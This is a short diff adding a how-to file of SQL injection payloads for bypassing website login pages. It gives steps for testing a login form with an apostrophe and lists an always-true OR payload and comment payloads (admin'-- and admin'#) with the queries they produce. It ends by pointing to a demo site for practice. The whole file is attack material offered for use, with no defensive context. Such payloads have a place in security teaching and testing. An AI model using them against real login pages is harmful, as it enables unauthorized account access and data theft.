@@ -1,0 +1,15 @@
+TO USE THESE PAYLOADS MAKE SURE SQL INJECTION WORKS ON THE WEBSITE LOGIN PAGE OR NOT...
+1) next to the username you have entered without a space add a single apostrophe. 
+2)Check if the error message while logging in has changed, for example:- SYNTAX ERROR, if it did! The website login page is vulnerable to SQL Injections 
+
+
+OR PAYLOAD 
+
+Example:- SELECT * FROM users WHERE username ='admin' OR '1'='1' AND password='password123'  --> How it would look:- In username - admin' OR '1' = '1
+
+Comment PAYLOAD
+
+Example:- SELECT * FROM users WHERE username ='admin'# AND password='password123'   /     SELECT * FROM users WHERE username ='admin'-- AND password='password123' > How it would look:- In username - admin'-- 
+
+
+Test SQL Injection hacking here:- http://testfire.net/login.jsp
